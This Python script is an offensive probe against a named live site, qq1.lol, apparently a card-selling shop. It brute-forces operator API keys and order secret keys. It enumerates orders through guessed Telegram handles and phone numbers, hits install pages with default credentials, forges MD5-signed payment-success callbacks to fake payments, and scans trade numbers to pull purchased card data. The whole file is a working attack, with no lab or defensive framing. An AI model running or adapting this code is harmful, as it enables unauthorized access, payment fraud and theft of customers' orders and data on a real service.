#!/usr/bin/env python3
"""qq1.lol deep probe round-3: query telegram/phone brute, operator API keys, install, syskey, epay formats"""
import hashlib
import json
import os
import re
import subprocess
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/workspace/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "deep3.log"
HITS = OUT / "deep3_hits.jsonl"
JAR = str(OUT / ".deep3_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HDR = ["-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "12")

OPERATOR_KEYS = [
    "qq1", "qq1.lol", "qq1lol", "buyi", "buyiq", "buyi123", "buyi888", "buyi666", "buyi520",
    "buyi2024", "buyi2025", "buyi2026", "布衣", "qqkqq", "QQKZC", "qqkzc", "830603",
    "kawei1", "ka1.one", "ka1one", "ka1", "qq0", "q8.qq0.lol", "fffzz", "hmjf", "htqq",
    "qw123", "kln166", "mckuai", "rainbow", "faka", "epay", "syskey", "jiankong", "cron",
    "123456", "admin", "888888", "666666", "secret", "authkey", "paykey", "merchant",
    "tianyu9080", "Lxsj@123", "ruoyi123", "abcdef", "password", "root", "test", "api",
    "apikey", "api_key", "token", "key", "authtoken", "对接密钥", "发卡", "自动发卡",
]
SYSKEY_WORDS = OPERATOR_KEYS + ["qq1admin", "qq1key", "qq1api", "buyiq123", "QQKQQ", "kln166top"]


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:5000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def curl(url, post=None, method="GET"):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR, "-A", UA] + HDR
    if method != "GET":
        cmd += ["-X", method]
    if post:
        cmd += ["-H", "Content-Type: application/x-www-form-urlencoded", "-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def is_order_hit(body):
    return body and ("kminfo" in body or ('"code":0' in body and "验证失败" not in body and "msg" in body))


def test_operator_api():
    log("=== [1] Operator API keys on %61pi.php ===")
    curl(BASE + "/")
    for key in OPERATOR_KEYS:
        for oid in (25944, 25943, 25900, 1):
            body = curl(f"{BASE}/%61pi.php?act=search&id={oid}&key={quote(key)}")
            if body and "请提供" not in body and ("kminfo" in body or '"code":0' in body):
                hit("api_key", f"key={key} id={oid}", body)
                return


def test_syskey_orders():
    log("=== [2] SYS_KEY skey on recent orders ===")
    curl(f"{BASE}/?mod=query")
    for oid in range(25920, 25945):
        for w in SYSKEY_WORDS:
            sk = hashlib.md5(f"{oid}{w}{oid}".encode()).hexdigest()
            body = curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey={sk}")
            if is_order_hit(body):
                hit("syskey", f"oid={oid} word={w} skey={sk}", body)
                return
        for sk in (str(oid), hashlib.md5(str(oid).encode()).hexdigest(), "qq1", "buyi"):
            body = curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey={sk}")
            if is_order_hit(body):
                hit("weak_skey", f"oid={oid} skey={sk}", body)
                return


def test_query_brute():
    log("=== [3] Query brute (telegram/phone/order) ===")
    contacts = []
    # telegram / 飞机号 patterns
    for u in ["buyi", "buyiq", "qqkqq", "qq1", "buyiqq", "buyiq123", "kawei1", "qqkzc", "布衣",
              "buyi888", "buyi666", "@buyi", "@buyiq", "@qqkqq", "@QQKZC", "@kawei1"]:
        contacts.append(u)
        contacts.append(u.lstrip("@"))
    # phones
    for pre in ("138", "139", "158", "188", "177", "136", "137", "150", "151", "186"):
        for suf in ("00000001", "88888888", "12345678", "66666666", "11111111", "83060300"):
            contacts.append(pre + suf)
    # order ids / trade_no patterns
    for i in range(25930, 25945):
        contacts.append(str(i))
    for tn in ("20260720145603146", "20260720215518263", "20260720215519140"):
        contacts.append(tn)
    seen = set()
    for c in contacts:
        if c in seen:
            continue
        seen.add(c)
        body = curl(f"{BASE}/ajax.php?act=query", "POST", f"data={quote(c)}")
        if not body or len(body) < 5:
            continue
        if '"code":0' in body or "showOrder" in body or "skey" in body or "kminfo" in body:
            hit("query", c, body)
            return
        if "订单" in body and "不存在" not in body and "未找到" not in body and "没有" not in body:
            hit("query_partial", c, body)


def test_install_deep():
    log("=== [4] Install deep probe ===")
    pages = [
        ("install/index.php", None),
        ("install/index.php", "step=1"),
        ("install/index.php", "step=2&db_host=127.0.0.1&db_user=root&db_pass=root&db_name=test"),
        ("install/index.php", "step=3&admin_user=admin&admin_pass=admin123"),
        ("install/update.php", None),
        ("install/install.php", None),
    ]
    for path, post in pages:
        body = curl(f"{BASE}/{path}", post, "POST" if post else "GET")
        if body and "已经安装" not in body and len(body) > 40:
            if any(x in body for x in ("数据库", "管理员", "安装成功", "setup", "mysql", "config")):
                hit("install", f"{path} {post or 'GET'}", body[:800])
    # lock file content / write test
    body = curl(f"{BASE}/install/install.lock")
    log(f"  install.lock: {body[:80]}")
    for m in ("PUT", "DELETE", "PATCH"):
        b = curl(f"{BASE}/install/install.lock", method=m)
        if b and "404" not in b[:60]:
            log(f"  lock {m}: {b[:80]}")


def test_epay_formats():
    log("=== [5] Epay notify format fuzz ===")
    tn = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
    params_sets = [
        {"pid": "1", "trade_no": tn, "out_trade_no": tn, "type": "alipay", "name": "test",
         "money": "99.00", "trade_status": "TRADE_SUCCESS"},
        {"trade_no": tn, "trade_status": "TRADE_SUCCESS", "money": "99"},
        {"out_trade_no": tn, "status": "1", "money": "99.00"},
        {"orderid": tn, "status": "success"},
    ]
    keys = ["", "123456", "qq1", "buyi", "epay", "mckuai", "admin", "888888"]
    for ep in ("other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"):
        for params in params_sets:
            for key in keys:
                items = sorted((k, v) for k, v in params.items() if v)
                sign = hashlib.md5(("&".join(f"{k}={v}" for k, v in items) + key).encode()).hexdigest()
                data = dict(params)
                data["sign"] = sign
                data["sign_type"] = "MD5"
                post = "&".join(f"{k}={v}" for k, v in data.items())
                body = curl(f"{BASE}/{ep}", "POST", post)
                if body and body.lower() in ("ok", "success") or (body and "success" in body.lower() and "fail" not in body.lower()):
                    hit("epay", f"{ep} key={key}", body)
                elif body and body not in ("error", "fail", "") and "签名" not in body and len(body) < 100:
                    log(f"  unusual {ep} key={key}: {body[:80]}")


def test_getshop_recent():
    log("=== [6] getshop recent trade_no window ===")
    now = datetime.now()
    for mins in range(180):
        t = now.replace(second=0, microsecond=0)
        from datetime import timedelta
        t = t - timedelta(minutes=mins)
        for suf in ("263", "140", "146", "001", "000"):
            tn = t.strftime("%Y%m%d%H%M%S") + suf
            body = curl(f"{BASE}/other/getshop.php?trade_no={tn}")
            if body and "未付款" not in body and "不存在" not in body and len(body) > 20:
                if "kminfo" in body or '"code":0' in body:
                    hit("getshop", tn, body)
                    return
        if mins % 30 == 0:
            log(f"  getshop scanned {mins}m")


def main():
    log("=== qq1 DEEP3 START ===")
    curl(BASE + "/")
    test_operator_api()
    test_syskey_orders()
    test_query_brute()
    test_install_deep()
    test_epay_formats()
    test_getshop_recent()
    n = sum(1 for _ in open(HITS)) if HITS.exists() else 0
    log(f"=== DEEP3 DONE hits={n} ===")


if __name__ == "__main__":
    main()
